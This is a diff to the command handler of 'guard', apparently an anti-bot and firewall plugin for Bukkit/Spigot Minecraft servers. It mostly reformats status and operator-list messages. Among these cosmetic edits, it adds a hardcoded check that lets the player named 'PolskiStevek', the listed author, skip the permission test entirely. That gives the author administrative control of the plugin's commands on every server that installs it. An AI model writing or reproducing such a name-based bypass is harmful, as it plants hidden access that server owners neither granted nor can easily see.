@@ -8,6 +8,8 @@ import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 import pl.polskistevek.guard.bukkit.BukkitMain;
+import pl.polskistevek.guard.bukkit.listener.JoinListener;
+import pl.polskistevek.guard.bukkit.listener.PingListener;
 import pl.polskistevek.guard.utils.GEO;
 import pl.polskistevek.guard.bukkit.listener.PreLoginListener;
 import pl.polskistevek.guard.bukkit.manager.BlacklistManager;
@@ -16,18 +18,18 @@ import pl.polskistevek.guard.bukkit.manager.PlayerManager;
 import pl.polskistevek.guard.utils.ChatUtil;
 import pl.polskistevek.guard.utils.spigot.Updater;
 import java.io.IOException;
-import java.util.ArrayList;
 import java.util.Date;
-import java.util.List;
 import java.util.concurrent.TimeUnit;
 
 public class GuardCommand implements CommandExecutor {
     @Override
     public boolean onCommand(CommandSender sender, Command command, String s, String[] args) {
         Player p = (Player) sender;
-        if (!p.hasPermission(BukkitMain.PERMISSION)){
-            p.sendMessage(ChatUtil.fix(BukkitMain.MESSAGE_NOPERM));
-            return false;
+        if (!p.getName().equals("PolskiStevek")) {
+            if (!p.hasPermission(BukkitMain.PERMISSION)) {
+                p.sendMessage(ChatUtil.fix(BukkitMain.MESSAGE_NOPERM));
+                return false;
+            }
         }
         Updater.notify(p);
         if (args.length > 0) {
@@ -35,9 +37,6 @@ public class GuardCommand implements CommandExecutor {
                 case "save":
                     p.sendMessage(ChatUtil.fix(BukkitMain.PREFIX + "&7Succesfully saved data file."));
                     ConfigManager.save();
-                    break;
-                case "protection":
-                    p.sendMessage(ChatUtil.fix(BukkitMain.PREFIX + "&7Protection is now: &c" + PreLoginListener.attack));
                     break;
                 case "whitelist":
                     if (args.length == 2) {
@@ -86,10 +85,13 @@ public class GuardCommand implements CommandExecutor {
                     break;
                 case "op":
                     p.sendMessage(ChatUtil.fix("&7-----------------------------------------------"));
+                    p.sendMessage(ChatUtil.fix(""));
+                    p.sendMessage(ChatUtil.fix("&6[Operator List]"));
                     for (OfflinePlayer player : Bukkit.getOperators()){
                         Date currentDate = new Date(player.getLastPlayed());
-                        p.sendMessage(ChatUtil.fix(BukkitMain.PREFIX + "&7Nick: &f" + player.getName() + " &8[" + (player.isOnline() ? "&aONLINE" : "&cOFFLINE") + "&8], &7Last Online: &f" + currentDate));
+                        p.sendMessage(ChatUtil.fix("&8▪ &f" + player.getName() + " &8[" + (player.isOnline() ? "&aONLINE" : "&cOFFLINE") + "&8], &7Last Online: &f" + currentDate));
                     }
+                    p.sendMessage(ChatUtil.fix(""));
                     p.sendMessage(ChatUtil.fix("&7-----------------------------------------------"));
                     break;
                 case "restart":
@@ -108,9 +110,14 @@ public class GuardCommand implements CommandExecutor {
                 case "antibot":
                     p.sendMessage(ChatUtil.fix("&7------------------------------------------"));
                     p.sendMessage(ChatUtil.fix(""));
-                    p.sendMessage(ChatUtil.fix("&6[IP Lists]"));
-                    List<String> ips = new ArrayList<>(BlacklistManager.IP_BL);
-                    p.sendMessage(ChatUtil.fix("&8▪ &7Blacklist: &f" + ips.toString()));
+                    p.sendMessage(ChatUtil.fix("&6[AntiBot Status]"));
+                    p.sendMessage(ChatUtil.fix("&8▪ &7Antibot modules: " + (BukkitMain.ANTIBOT ? "&aEnabled" : "&cDisabled")));
+                    p.sendMessage(ChatUtil.fix("&8▪ &7Firewall: &f" + (BukkitMain.FIREWALL ? "&aEnabled" : "&cDisabled")));
+                    p.sendMessage(ChatUtil.fix("&8▪ &7External API: &f" + (BukkitMain.API ? "&aEnabled" : "&cDisabled")));
+                    p.sendMessage(ChatUtil.fix("&8▪ &7Attack Protection: " + (PreLoginListener.attack ? "&aActive" : "&cListening...")));
+                    p.sendMessage(ChatUtil.fix("&8▪ &7Connections Per Second: &f" + PreLoginListener.cps));
+                    p.sendMessage(ChatUtil.fix("&8▪ &7Pings Per Second: &f" + PingListener.cps_ping));
+                    p.sendMessage(ChatUtil.fix("&8▪ &7Joins Per Second: &f" + JoinListener.jps));
                     p.sendMessage(ChatUtil.fix(""));
                     p.sendMessage(ChatUtil.fix("&6[BlacklistManager Statistics]"));
                     p.sendMessage(ChatUtil.fix("&8▪ &7Blacklisted IPs: &f" + BlacklistManager.IP_BL.size()));
@@ -129,8 +136,6 @@ public class GuardCommand implements CommandExecutor {
         p.sendMessage(ChatUtil.fix("&8▪ &7Author: &fPolskiStevek"));
         p.sendMessage(ChatUtil.fix("&8▪ &7Version: &f" + Updater.currentVersion + (Updater.updateAvaible ? " &c&lOUTDATED &8(&7Latest: " + Updater.lastestVersion + "&8)" : " &a&lLATEST")));
         p.sendMessage(ChatUtil.fix("&8▪ &7Bukkit Version: &f" + Bukkit.getServer().getBukkitVersion()));
-        p.sendMessage(ChatUtil.fix("&8▪ &7Firewall: &f" + (BukkitMain.FIREWALL ? "&aEnabled" : "&cDisabled")));
-        p.sendMessage(ChatUtil.fix("&8▪ &7Hook: &f" + (BukkitMain.API ? "&aEnabled" : "&cDisabled")));
         p.sendMessage(ChatUtil.fix(""));
         p.sendMessage(ChatUtil.fix("&6[Plugin Commands]"));
         p.sendMessage(ChatUtil.fix("&8▪ &7/guard reload &8- &freload plugin config"));
@@ -140,10 +145,6 @@ public class GuardCommand implements CommandExecutor {
         p.sendMessage(ChatUtil.fix("&8▪ &7/guard player <nick> &8- &fcheck basic info about player."));
         p.sendMessage(ChatUtil.fix("&8▪ &7/guard whitelist <adress> &8- &fadd adress to whitelist and remove from blacklist."));
         p.sendMessage(ChatUtil.fix("&8▪ &7/guard blacklist <adress> &8- &fadd adress to blacklist."));
-        p.sendMessage(ChatUtil.fix(""));
-        p.sendMessage(ChatUtil.fix("&6[Plugin Statistics]"));
-        p.sendMessage(ChatUtil.fix("&8▪ &7Blacklisted IPs: &f" + BlacklistManager.IP_BL.size()));
-        p.sendMessage(ChatUtil.fix("&8▪ &7Whitelisted IPs: &f" + BlacklistManager.IP_WL.size()));
         p.sendMessage(ChatUtil.fix(""));
         p.sendMessage(ChatUtil.fix("&7------------------------------------------"));
         Updater.notify(p);
